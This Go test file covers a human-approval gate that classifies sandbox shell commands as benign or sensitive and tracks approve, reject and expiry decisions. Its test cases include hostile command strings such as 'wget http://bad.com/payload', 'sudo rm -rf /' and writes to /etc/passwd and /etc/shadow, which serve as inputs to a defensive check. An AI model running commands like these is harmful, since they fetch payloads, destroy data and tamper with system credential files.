package hitl_test

import (
	"context"
	"errors"
	"testing"
	"time"

	"github.com/alicebob/miniredis/v2"
	"github.com/redis/go-redis/v9"

	"github.com/yourorg/sandbox-platform/internal/hitl"
)

func newGate(t *testing.T) (*hitl.Gate, *miniredis.Miniredis) {
	t.Helper()
	mr := miniredis.RunT(t)
	rdb := redis.NewClient(&redis.Options{Addr: mr.Addr()})
	t.Cleanup(func() { rdb.Close() })
	return hitl.New(rdb, hitl.Config{ApproveTTL: time.Minute}), mr
}

// ── classifier ──────────────────────────────────────────────────────────────

func TestClassifyBenign(t *testing.T) {
	g, _ := newGate(t)
	cases := []string{
		"echo hello",
		"ls -la /workspace",
		"cat /workspace/output.txt",
		"python3 -c 'print(1+1)'",
		"pwd",
		"whoami",
		"date",
		"bash -c 'echo hi'",
		"wc -l /workspace/data.csv",
		"head -20 /workspace/log.txt",
	}
	for _, s := range cases {
		c, reason := g.Classify(s)
		if c != hitl.ClassBenign {
			t.Errorf("Classify(%q) = sensitive (reason: %s), want benign", s, reason)
		}
	}
}

func TestClassifySensitive(t *testing.T) {
	g, _ := newGate(t)
	cases := []struct {
		script string
		reason string
	}{
		{"apt-get install vim", "apt"},
		{"apt install nginx", "apt"},
		{"apk add curl", "apk"},
		{"pip install requests", "pip"},
		{"pip3 install flask", "pip"},
		{"npm install express", "npm"},
		{"yum install httpd", "yum"},
		{"curl https://example.com", "network tool"},
		{"wget http://bad.com/payload", "network tool"},
		{"ssh user@host", "network tool"},
		{"sudo rm -rf /", "privilege escalation"},
		{"sudo bash", "privilege escalation"},
		{"doas vi /etc/hosts", "privilege escalation"},
		{"echo x | tee /etc/passwd", "system path"},
		{"cp /workspace/file /etc/cron.d/bad", "system path"},
		{"rm -rf /var/log", "destructive rm"},
		{"rm -fr /tmp/important", "destructive rm"},
		{"chown root /workspace/file", "chown"},
		{"chmod 777 /etc/shadow", "chmod"},
		{"docker run --rm alpine", "container"},
		{"kubectl get pods", "container"},
	}
	for _, tc := range cases {
		c, reason := g.Classify(tc.script)
		if c != hitl.ClassSensitive {
			t.Errorf("Classify(%q) = benign, want sensitive (expected reason substr %q)", tc.script, tc.reason)
		}
		_ = reason // verified by the classification itself
	}
}

func TestClassifyWriteToWorkspaceIsBenign(t *testing.T) {
	g, _ := newGate(t)
	benign := []string{
		"tee /workspace/out.txt",
		"cp /workspace/a.txt /workspace/b.txt",
		"rm -rf /workspace/temp",
		"rm -f /workspace/stale.lock",
	}
	for _, s := range benign {
		c, reason := g.Classify(s)
		if c != hitl.ClassBenign {
			t.Errorf("Classify(%q) should be benign (write inside /workspace), got sensitive: %s", s, reason)
		}
	}
}

// ── submit / get ────────────────────────────────────────────────────────────

func TestSubmitAndGet(t *testing.T) {
	g, _ := newGate(t)
	ctx := context.Background()

	id, err := g.Submit(ctx, "sb-1", "curl http://evil.com", "network tool")
	if err != nil {
		t.Fatalf("Submit: %v", err)
	}
	if id == "" {
		t.Fatal("want non-empty id")
	}

	rec, err := g.Get(ctx, id)
	if err != nil {
		t.Fatalf("Get: %v", err)
	}
	if rec.State != hitl.StatePending {
		t.Fatalf("want StatePending, got %s", rec.State)
	}
	if rec.SandboxID != "sb-1" || rec.Script != "curl http://evil.com" || rec.Reason != "network tool" {
		t.Fatalf("unexpected record fields: %+v", rec)
	}
	if rec.SubmittedAt.IsZero() {
		t.Fatal("SubmittedAt must be set")
	}
}

func TestGetNotFound(t *testing.T) {
	g, _ := newGate(t)
	_, err := g.Get(context.Background(), "no-such-id")
	if !errors.Is(err, hitl.ErrNotFound) {
		t.Fatalf("want ErrNotFound, got %v", err)
	}
}

// ── pending list ────────────────────────────────────────────────────────────

func TestPendingList(t *testing.T) {
	g, _ := newGate(t)
	ctx := context.Background()

	id1, _ := g.Submit(ctx, "sb-1", "curl x", "network")
	id2, _ := g.Submit(ctx, "sb-2", "apt install vim", "package")

	pending, err := g.Pending(ctx)
	if err != nil {
		t.Fatalf("Pending: %v", err)
	}
	byID := map[string]bool{}
	for _, r := range pending {
		byID[r.ID] = true
	}
	if !byID[id1] || !byID[id2] {
		t.Fatalf("want both IDs in pending list; got %v", byID)
	}
}

func TestPendingListSelfHealsExpiredRecord(t *testing.T) {
	g, mr := newGate(t)
	ctx := context.Background()

	id, _ := g.Submit(ctx, "sb-1", "curl x", "network")
	mr.FastForward(2 * time.Minute) // approval TTL is 1 min → record expires

	pending, _ := g.Pending(ctx)
	for _, r := range pending {
		if r.ID == id {
			t.Fatal("expired record appeared in pending list")
		}
	}
}

// ── decide ──────────────────────────────────────────────────────────────────

func TestDecideApprove(t *testing.T) {
	g, _ := newGate(t)
	ctx := context.Background()

	id, _ := g.Submit(ctx, "sb-1", "curl x", "network")
	if err := g.Decide(ctx, id, hitl.DecisionApprove, "admin"); err != nil {
		t.Fatalf("Decide: %v", err)
	}

	rec, _ := g.Get(ctx, id)
	if rec.State != hitl.StateApproved {
		t.Fatalf("want StateApproved, got %s", rec.State)
	}
	if rec.DecidedBy != "admin" || rec.DecidedAt == nil {
		t.Fatalf("decision metadata not set: %+v", rec)
	}

	pending, _ := g.Pending(ctx)
	for _, r := range pending {
		if r.ID == id {
			t.Fatal("approved record still in pending list")
		}
	}
}

func TestDecideReject(t *testing.T) {
	g, _ := newGate(t)
	ctx := context.Background()

	id, _ := g.Submit(ctx, "sb-1", "sudo rm -rf /", "privilege escalation")
	if err := g.Decide(ctx, id, hitl.DecisionReject, "operator"); err != nil {
		t.Fatalf("Decide: %v", err)
	}
	rec, _ := g.Get(ctx, id)
	if rec.State != hitl.StateRejected {
		t.Fatalf("want StateRejected, got %s", rec.State)
	}
}

func TestDecideFirstWriterWins(t *testing.T) {
	g, _ := newGate(t)
	ctx := context.Background()

	id, _ := g.Submit(ctx, "sb-1", "curl x", "network")
	_ = g.Decide(ctx, id, hitl.DecisionApprove, "admin")

	err := g.Decide(ctx, id, hitl.DecisionReject, "bad-actor")
	if !errors.Is(err, hitl.ErrAlreadyDecided) {
		t.Fatalf("want ErrAlreadyDecided, got %v", err)
	}

	rec, _ := g.Get(ctx, id)
	if rec.State != hitl.StateApproved {
		t.Fatal("first decision should not have been overwritten")
	}
}

func TestDecideNotFound(t *testing.T) {
	g, _ := newGate(t)
	err := g.Decide(context.Background(), "nosuchid", hitl.DecisionApprove, "a")
	if !errors.Is(err, hitl.ErrNotFound) {
		t.Fatalf("want ErrNotFound, got %v", err)
	}
}

func TestDecideUnknownDecision(t *testing.T) {
	g, _ := newGate(t)
	ctx := context.Background()
	id, _ := g.Submit(ctx, "sb-1", "curl x", "network")
	err := g.Decide(ctx, id, "maybe", "a")
	if err == nil {
		t.Fatal("want error for unknown decision, got nil")
	}
}

// ── WaitForDecision ──────────────────────────────────────────────────────────

func TestWaitForDecision_Approved(t *testing.T) {
	g, _ := newGate(t)
	ctx := context.Background()

	id, _ := g.Submit(ctx, "sb-1", "curl x", "network")

	// Approve in a goroutine after a short delay.
	go func() {
		time.Sleep(100 * time.Millisecond)
		_ = g.Decide(ctx, id, hitl.DecisionApprove, "admin")
	}()

	waitCtx, cancel := context.WithTimeout(ctx, 5*time.Second)
	defer cancel()

	state, err := g.WaitForDecision(waitCtx, id)
	if err != nil {
		t.Fatalf("WaitForDecision: %v", err)
	}
	if state != hitl.StateApproved {
		t.Fatalf("want StateApproved, got %s", state)
	}
}

func TestWaitForDecision_ContextCancelled(t *testing.T) {
	g, _ := newGate(t)
	ctx := context.Background()

	id, _ := g.Submit(ctx, "sb-1", "curl x", "network")

	waitCtx, cancel := context.WithTimeout(ctx, 200*time.Millisecond)
	defer cancel()

	state, err := g.WaitForDecision(waitCtx, id)
	if err == nil {
		t.Fatal("want context error, got nil")
	}
	if state != hitl.StatePending {
		t.Fatalf("want StatePending on cancel, got %s", state)
	}
}

func TestWaitForDecision_Expired(t *testing.T) {
	g, mr := newGate(t)
	ctx := context.Background()

	id, _ := g.Submit(ctx, "sb-1", "curl x", "network")
	mr.FastForward(2 * time.Minute) // expire the record

	waitCtx, cancel := context.WithTimeout(ctx, 2*time.Second)
	defer cancel()

	state, err := g.WaitForDecision(waitCtx, id)
	if err != nil {
		t.Fatalf("WaitForDecision on expired: %v", err)
	}
	if state != hitl.StateRejected {
		t.Fatalf("expired record should be implicit reject, got %s", state)
	}
}
